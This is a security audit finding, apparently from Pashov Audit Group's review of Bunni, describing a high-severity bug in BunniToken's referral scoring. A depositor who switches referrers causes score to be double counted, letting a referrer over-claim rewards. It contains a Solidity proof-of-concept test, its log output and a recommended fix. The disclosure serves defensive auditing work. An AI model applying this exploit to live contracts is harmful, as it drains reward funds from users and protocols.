---
# Core Classification
protocol: Bunni-August
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 43545
audit_firm: Pashov Audit Group
contest_link: none
source_link: https://github.com/pashov/audits/blob/master/team/md/Bunni-security-review-August.md
github_link: none

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Pashov Audit Group
---

## Vulnerability Title

[C-06] Double counting of referral scores leading to over-claiming of tokens

### Overview


This bug report describes a high severity issue in the `BunniToken` smart contract. The bug allows an attacker to manipulate the referral scoring system by minting tokens using one referrer and then minting more tokens using a different referrer. This results in the score for the first referrer being transferred to the second referrer, allowing them to claim more tokens than they should. The report includes a test that demonstrates how the bug can be exploited. The recommended solution is to process the rewards before transferring the score if the depositor changes their referrer.

### Original Finding Content

## Severity

**Impact:** High

**Likelihood:** High

## Description

An attacker can exploit the referral scoring system in `BunniToken.sol` by minting tokens using one referrer (`referrer1`), and then minting additional tokens using a different referrer (`referrer2`). This manipulation results in the score for the first referrer being transferred to the second referrer, leading to double counting of the score. Consequently, the second referrer can claim more tokens than they should be able to, effectively draining the rewards funds.

The following test demonstrates how initially both `depositor1` and `depositor2` each deposit `1 ether`, using `referrer1` and `referrer2`, respectively. Then, the `owner` distributes `1 ether` as a reward, resulting in each depositor having `0.5 ether`. Afterward, `depositor1` claims the `0.5 ether` rewards. Subsequently, **`depositor1` mints `0.1 ether` worth of tokens, but this time specifies a different referrer**, changing it to `referrer2`. This causes the score for `referrer2` to increase and the rewards that `referrer2` can claim to also increase. This is incorrect, as it allows the score to be claimed multiple times.

```solidity
    function test_claim_mint_doubleCount() public {
        bool isToken0 = true;
        uint256 amountToDistribute = 1 ether;
        // register depositors and referrers
        address depositor1 = makeAddr("depositor1");
        address referrer1Address = makeAddr("referrer1");
        hub.setReferrerAddress(1, referrer1Address);
        address depositor2 = makeAddr("depositor2");
        address referrer2Address = makeAddr("referrer2");
        hub.setReferrerAddress(2, referrer2Address);
        //
        // 1. `Depositor1` deposits 1 ether. referrer1 gets score
        console.log("Depositor1 deposits token using referrer1");
        _makeDeposit(key, 1 ether, 1 ether, depositor1, 1);
        console.log("ScoreOf referrer1", bunniToken.scoreOf(1));
        //
        // 2. `Depositor2` deposits 1 ether. referrer2 gets score.
        console.log("Depositor2 deposits token using referrer2");
        _makeDeposit(key, 1 ether, 1 ether, depositor2, 2);
        console.log("ScoreOf referrer2", bunniToken.scoreOf(2));
        //
        // 3. Distribute rewards to the `BunniToken`
        console.log("\nOwner distributes 1 ether rewards...");
        Currency token = isToken0 ? currency0 : currency1;
        poolManager.unlock(abi.encode(token, amountToDistribute));
        bunniToken.distributeReferralRewards(isToken0, amountToDistribute);
        //
        (uint256 referrer1Reward0, uint256 referrer1Reward1) = bunniToken.claimReferralRewards(1);
        (uint256 referrer2Reward0, uint256 referrer2Reward1) = bunniToken.getClaimableReferralRewards(2);
        console.log("ScoreOf referrer1", bunniToken.scoreOf(1));
        console.log("ScoreOf referrer2", bunniToken.scoreOf(2));
        console.log("Rewards claimed by referrer1", referrer1Reward0, referrer1Reward1);
        console.log("Rewards claimable by referrer2", referrer2Reward0, referrer2Reward1);
        //
        // 4. Malicious `Depositor1` deposits 0.1 ether again but he changes the referrer1 to referrer2
        console.log("\nMalicious Depositor1 deposits more token using referrer2 (referrer is modified)");
        _makeDeposit(key, 0.1 ether, 0.1 ether, depositor1, 2);
        (referrer1Reward0, referrer1Reward1) = bunniToken.getClaimableReferralRewards(1);
        (referrer2Reward0, referrer2Reward1) = bunniToken.getClaimableReferralRewards(2);
        (uint256 referrer3Reward0, uint256 referrer3Reward1) = bunniToken.getClaimableReferralRewards(3);
        console.log("ScoreOf referrer1", bunniToken.scoreOf(1));
        console.log("ScoreOf referrer2", bunniToken.scoreOf(2));
        console.log("Rewards claimable by referrer1", referrer1Reward0, referrer1Reward1);
        console.log("Rewards claimable by referrer2", referrer2Reward0, referrer2Reward1);
    }
```

It can be observed that, in the end, `referrer2` is able to claim `1.04 eth (1049999999999999499)`, which is incorrect. They should only be able to claim `0.5 eth (500000000000000000)` plus `0.04 eth (49999999999999499)`:

```bash
Ran 1 test for test/BunniToken.t.sol:BunniTokenTest
[PASS] test_claim_mint_doubleCount() (gas: 1105750)
Logs:
  Depositor1 deposits token using referrer1
  ScoreOf referrer1 999999999999999000
  Depositor2 deposits token using referrer2
  ScoreOf referrer2 1000000000000000000

The owner distributes 1 ether rewards...
  ScoreOf referrer1 999999999999999000
  ScoreOf referrer2 1000000000000000000
  Rewards claimed by referrer1 499999999999999500 0
  Rewards claimable by referrer2 500000000000000000 0

Malicious Depositor1 deposits more token using referrer2 (referrer is modified)
  ScoreOf referrer1 0
  ScoreOf referrer2 2099999999999998998
  Rewards claimable by referrer1 0 0
  Rewards claimable by referrer2 1049999999999999499 0
```

The issue arises when `ERC20Referrer::_mint` is called and the referrer is changed. The `score` is transferred to the new referrer; however, when switching from one referrer to another, the rewards are not claimed by the new referrer. This causes the score to be counted twice, allowing it to be used again in the function that calculates the rewards.

## Recommendations

It is recommended that if the depositor changes their referrer, the rewards assigned to the referrer to whom the `score` will be transferred should be processed before transferring the `score`.

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Pashov Audit Group |
| Protocol | Bunni-August |
| Report Date | N/A |
| Finders | Pashov Audit Group |

### Source Links

- **Source**: https://github.com/pashov/audits/blob/master/team/md/Bunni-security-review-August.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

